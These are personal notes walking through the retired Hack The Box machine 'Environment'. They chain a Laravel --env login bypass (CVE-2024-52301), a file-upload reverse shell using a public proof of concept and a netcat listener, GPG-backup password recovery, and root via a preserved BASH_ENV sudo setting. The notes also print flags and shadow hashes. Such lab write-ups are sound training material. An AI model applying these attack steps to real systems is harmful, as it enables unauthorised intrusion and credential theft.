---
file_created: 08 Sep 2025 11:49
title: Environment
difficulty: Medium
difficult_sort: 2
points: 0
os: Linux
target_ip: 10.10.11.67
platform: Hack The Box
category: B2R
box_status: Retired
url: https://app.hackthebox.com/machines/Environment
user_flag: true
root_flag: true
completed: false
date_finish: 2025-09-16
tags: htb/machines
---
# Resolution summary
## About
`Environment` is a medium-difficulty Linux machine. 
- The initial foothold involves exploiting [CVE-2024-52301](https://nvd.nist.gov/vuln/detail/CVE-2024-52301), which allows environment manipulation through an `--env` parameter, bypassing the login functionality.
- From the management dashboard, [CVE-2024-2154](https://nvd.nist.gov/vuln/detail/CVE-2024-2154) is exploited to upload a `PHP` webshell embedded inside a profile image, giving the player a foothold through command execution. 
- On the compromised system, exposed `GPG` keys can be found along with an encrypted backup. The decrypted data contains valid user passwords, enabling `SSH` access. 
- Privilege escalation is achieved by leveraging sudo permissions. The user is allowed to execute a script with elevated privileges. Although the script itself is harmless, the `BASH_ENV` environment variable is preserved while increasing privileges, which allows execution of arbitrary commands as root.
>[!summary]
>- Step 1
>- Step 2
## Tutorial

```cardlink
url: https://www.youtube.com/watch?v=XUEr-CM3Y6Q
title: "HackTheBox - Environment"
description: "00:00 - Introduction01:00 - Start of nmap02:30 - Discovering that Laravel is running based upon 404 page (or cookie)04:40 - Running GoBuster, adding 403 to t..."
host: www.youtube.com
favicon: https://www.youtube.com/s/desktop/814d40a6/img/favicon_32x32.png
image: https://i.ytimg.com/vi/XUEr-CM3Y6Q/maxresdefault.jpg
```
- [write-up](<./attachments/Environment.pdf>)
- [medium](https://medium.com/@qinncade/environment-htb-walkthrough-a4e3d90d3a48)
## Improved skills
- Skill 1
- Skill 2

## Used tools
1. nmap
2. gobuster
3. burp suite 
---
# Information Gathering
- SSH -port 21: OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)
- HTTP -port 80: nginx 1.22.1
## Scanned all TCP ports:

```bash
rustscan -a $IP -r 1-65535 -t 10000 --ulimit 5000

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack
```

## Enumerated open TCP ports:

```bash
nmap -p 22,80 -sC -sV -oA scans/open-ports $ip -Pn -vv


PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)
| ssh-hostkey:
|   256 5c:02:33:95:ef:44:e2:80:cd:3a:96:02:23:f1:92:64 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGrihP7aP61ww7KrHUutuC/GKOyHifRmeM070LMF7b6vguneFJ3dokS/UwZxcp+H82U2LL+patf3wEpLZz1oZdQ=
|   256 1f:3d:c2:19:55:28:a1:77:59:51:48:10:c4:4b:74:ab (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ7xeTjQWBwI6WERkd6C7qIKOCnXxGGtesEDTnFtL2f2
80/tcp open  http    syn-ack nginx 1.22.1
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
| http-methods:
|_  Supported Methods: GET HEAD
|_http-title: Save the Environment | environment.htb
|_http-server-header: nginx/1.22.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
---
# Enumeration

## Port 80 - HTTP (Apache)
- Need to redirect to `http://environment.htb` 
### Redirection to `/etc/hosts`
```bash
echo "$IP environment.htb" | sudo tee -a /etc/hosts
```
### Curl the page 
```bash
curl -I http://environment.htb                                                                         
HTTP/1.1 200 OK
Server: nginx/1.22.1
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
Cache-Control: no-cache, private
Date: Mon, 08 Sep 2025 12:54:19 GMT
Set-Cookie: XSRF-TOKEN=eyJpdiI6InJ6WTI1bytHdlZJT2NKbGxUcGpWbmc9PSIsInZhbHVlIjoiaDgwK2lYelJzZ0sxbFVVTkJxRFBkZkhXdzBKazdlcldnaTRGY2Z6TE1rZTkyeElFeHFnQ2VZRHpTVkEzbHhCalphSm1ZTGtBaVpCZEZjdXduNFRjc3pmbWhLb1BsTUEwREJYd2hxc0UwVVhVNVdpZGlPY1c5UVl2NU9xNVI4V3giLCJtYWMiOiIxNGQ0OGY3MWEwZWY4NGQ5MzE2YWViYzU4ZDI1OWE4Yjc1YmU1NDAzMmNkYTE2ZjkyMzA2MGY1ODc5N2UwZGZhIiwidGFnIjoiIn0%3D; expires=Mon, 08 Sep 2025 14:54:19 GMT; Max-Age=7200; path=/; samesite=lax
Set-Cookie: laravel_session=eyJpdiI6IldCdHp4TEx1VHJyeUl0aDR4L250UHc9PSIsInZhbHVlIjoiUjJCZnliVUJMZmpyTTkyWmNMSjlnL243dkVpc08xUngwbTV4cTJrNitSK3k2T01SN0dROUZwUk9Qc2R1dW4zT2NyeVQ5VG1BeXJnZFFhbDdQdE0vQ09Da0lObi9oc3FabkZEK20wWTV0RWpwV2ZYamFxNjY4bWJTWUxNcjFYRE4iLCJtYWMiOiI1ZGFhNzE5NWZhMDYwY2MyNmJhNDJiYmVmNTQ4YWFjYjMyYTMxMmRiOTE2ZDYwODJlZTU1NWIxODM2YWI3MGJmIiwidGFnIjoiIn0%3D; expires=Mon, 08 Sep 2025 14:54:19 GMT; Max-Age=7200; path=/; httponly; samesite=lax
X-Frame-Options: SAMEORIGIN
X-Content-Type-Options: nosniff
```
### Gobuster scan
```bash
login                (Status: 200) [Size: 2391]
logout               (Status: 302) [Size: 358] [--> http://environment.htb/login]
upload               (Status: 405) [Size: 244854]
mailing              (Status: 405) [Size: 244856]
up                   (Status: 200) [Size: 2125]
storage              (Status: 301) [Size: 169] [--> http://environment.htb/storage/]
build                (Status: 301) [Size: 169] [--> http://environment.htb/build/]
vendor               (Status: 301) [Size: 169] [--> http://environment.htb/vendor/]
```
### Homepage and wappanayzler
- site: [environment](http://environment.htb/)
![300](<./attachments/Environment.png>)
### Login Page
- browsed via `http://environment.htb/login`
![300](<./attachments/Environment-4.png>)
### 404 Not Found Error page
- browsed `http://environment.htb/404`
- [Laravel](https://laravel.com/) is a PHP web framework. The default 404 page looks like:
![300](<./attachments/Environment.png>)
---
# Initial foothold
- Access via `http://environment.htb/uploads`
-  Laravel Debug Interface was left enabled on the production website, which reveals the Laravel version **11.30.0** along
- PHP 8.2.28 
- Laravel 11.30.0 - [CVE-2024-52301](https://www.cvedetails.com/cve/CVE-2024-52301/ "CVE-2024-52301 security vulnerability details") 
- https://github.com/Nyamort/CVE-2024-52301
![300](<./attachments/Environment-1.png>)
---
# Exploitation

## CVE-2024-52301 POC
- The initial foothold involves exploiting [CVE-2024-52301](https://nvd.nist.gov/vuln/detail/CVE-2024-52301), which allows environment manipulation through an `--env` parameter, bypassing the login functionality.
- Enter in browser http://environment.htb/?--env=dev
### Testing the exploit
- Before
![](<./attachments/Environment-2.png>)
- After 
![300](<./attachments/Environment-3.png>)
### Burp suite of the login page
- login use burp suite with foxy proxy
- creds `test@mail.com:test1234` - can be anything
- remove the email to see what happens
![](<./attachments/Environment-5.png>)
 - Before
![500](<./attachments/Environment-6.png>)
- After
![](<./attachments/Environment-7.png>)
### Vulnerability
- this code part is vunibaly, if the remember veriable is set to an non-boonlean value(True/False) more of the code will be shown
```php
   if($remember == 'False') {
        $keep_loggedin = False;
    } elseif ($remember == 'True') {
        $keep_loggedin = True;
    }
```
 - Change it to `hello`
![](<./attachments/Environment-8.png>)

```php
  if(App::environment() == "preprod") { //QOL: login directly as me in dev/local/preprod envs

        $request->session()->regenerate();

        $request->session()->put('user_id', 1);

        return redirect('/management/dashboard');

    }
```
### To Access management dashboard
- change `POST /login HTTP/1.1` to `POST /login?--env=preprod HTTP/1.1`

![](<./attachments/Environment-10.png>)
- Forwarding gives access to `http://environment.htb/management/dashboard`
- Profile can upload file
![](<./attachments/Environment-11.png>)
- after gaining access to dashboard
- can use `http://environment.htb/management/info?--env=preprod` to get php info page
![](<./attachments/Environment-12.png>)
### Profile Page - Vulnerable
- Try change the name variable to something random
![](<./attachments/Environment-13.png>)
- got error `Some error occured during uploading`
- 
![](<./attachments/Environment-15.png>)
- google search `Some error occured during uploading file upload`
![](<./attachments/Environment-16.png>)
- `UniSharp laravel-filemanager` search for CVE found [CVE-2024-21546](https://nvd.nist.gov/vuln/detail/CVE-2024-21546)
## CVE-2024-21546: File Upload Attack
Get [CVE-2024-21546.poc](https://github.com/ajdumanhug/CVE-2024-21546?tab=readme-ov-file) 
To exploit the upload function, we first create run netcat listener

```bash
nc -lvnp 4444
```
- The syntax to use
```bash
python3 CVE-2024-21546.py <target_url> <listener_ip> <listener_port> <laravel_session>
```

```sh title:command-lastest-used
python3 CVE-2024-21546.py http://environment.htb 10.10.14.121 9001 eyJpdiI6IkFaZHV3bUtEYlVRMHY1dHFSS3FzblE9PSIsInZhbHVlIjoiNWRVZTNIcDBxcGgvS2hRVVpLWFZuNmUzbVlpY1JJVEdINU1lRFJHa1pWSTdOamJqbTc2MzlabU1JZDgvcXNuWnJIUDhXY2o2NUFDYWJEbGpvenJMaXhNYXQzUDlablg4YUFHb2pCVkNSd2x5Yzd4U2pqR2lpMTNOcnpsT0JyeVQiLCJtYWMiOiIxNjAwNWE4ZDEzMWE0OGM3MTIyY2M2MTc0YmZhNzVkOGE5MzUxYTA1ZGU0YWE4OGMyZjJkNjYwMDM2MTc4ZWZiIiwidGFnIjoiIn0%3D
```
- gained access to www-data
![](<./attachments/Environment-17.png>)
# Lateral Movement to hish

## Local enumeration
- uid=33(www-data) gid=33(www-data) groups=33(www-data)
- cd into `/app` and do database check `find . grep sql` ; access the database 
- run `sqlite3 database.sqlite3 .dump`; the result:
![](<./attachments/Environment-20.png>)
- for this we can use command `sqlite3 database.sqlite` to access sqlite
- then enter  `select email,password from users;` 
![](<./attachments/Environment-21.png>)
- can access `/home/hish` and `ls -al`
- locatated  user.txt and backup folder , also has a hidden .[gnupg](https://www.gnupg.org/)  folder
- `cp -r /home/hish/.gnupg/ /dev/shm` - /dev/shm is a temporary file storage filesystem
- need to change `$HOME` variable for  next part `export HOME=home/hish`
```sh
gpg -d --homedir /dev/shm/.gnupg /home/hish/backup/keyvault.gpg
```

```bash
www-data@environment:/dev/shm$ gpg -d --homedir /dev/shm/.gnupg /home/hish/backup/keyvault.gpg
gpg: encrypted with 2048-bit RSA key, ID B755B0EDD6CFCFD3, created 2025-01-11
      "hish_ <hish@environment.htb>"
PAYPAL.COM -> Ihaves0meMon$yhere123
ENVIRONMENT.HTB -> marineSPm@ster!! # ssh password to hish
FACEBOOK.COM -> summerSunnyB3ACH!!
```
## Lateral movement vector
> [!important] Creds
> hish:marineSPm@ster!!

```sh
sshpass -p 'marineSPm@ster!!' ssh hish@environment.htb -p22
```

---

# Privilege Escalation to root

## Local enumeration
```bash
uname -a
Linux environment 6.1.0-34-amd64 1 SMP PREEMPT_DYNAMIC
Debian 6.1.135-1 (2025-04-25) x86_64 GNU/Linux
```
```bash
 sudo -l
[sudo] password for hish:
Matching Defaults entries for hish on environment:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, env_keep+="ENV
    BASH_ENV", use_pty

User hish may run the following commands on environment:
    (ALL) /usr/bin/systeminfo
```
```bash
id
uid=1000(hish) gid=1000(hish) groups=1000(hish),24(cdrom),25(floppy),29(audio),30(dip),44(video),
46(plugdev),100(users),106(netdev),110(bluetooth)
```
- `hish` can run `/usr/bin/systeminfo` as sudo
- make a file with `vi /dev/shm/pwn.sh`
```bash
#!/bin/bash 
bash
```

![](<./attachments/Environment-22.png>)

## Privilege Escalation vector
```bash
root@environment:/home/hish# id
uid=0(root) gid=0(root) groups=0(root)
```
- ` cd /root`
---

# Trophy
## User Flag
```txt
f2755072ab8917989b3ec151ced8cd1f
```
## Root Flag
```txt
514eb8c0cdb3ea1d0c672c2b5a04ea31
```
## **/etc/shadow**

```bash
hish:$y$j9T$4I1ToSPTrzuz2EoDweHsP/$7rS9lhc9.n/Hrx4r.bJ9KsKIpOaPDV0mj4pgLV2PF/7:20094:0:99999:7:::
root:$y$j9T$ri4ncGGOHy2ucyMf0/wae1$qfFOfsAj1qUCeQyGnjCYhdLQ9XqcCOBscht51lZEei1:20094:0:99999:7:::
```

---
# Proof
![](<./attachments/Environment-23.png>)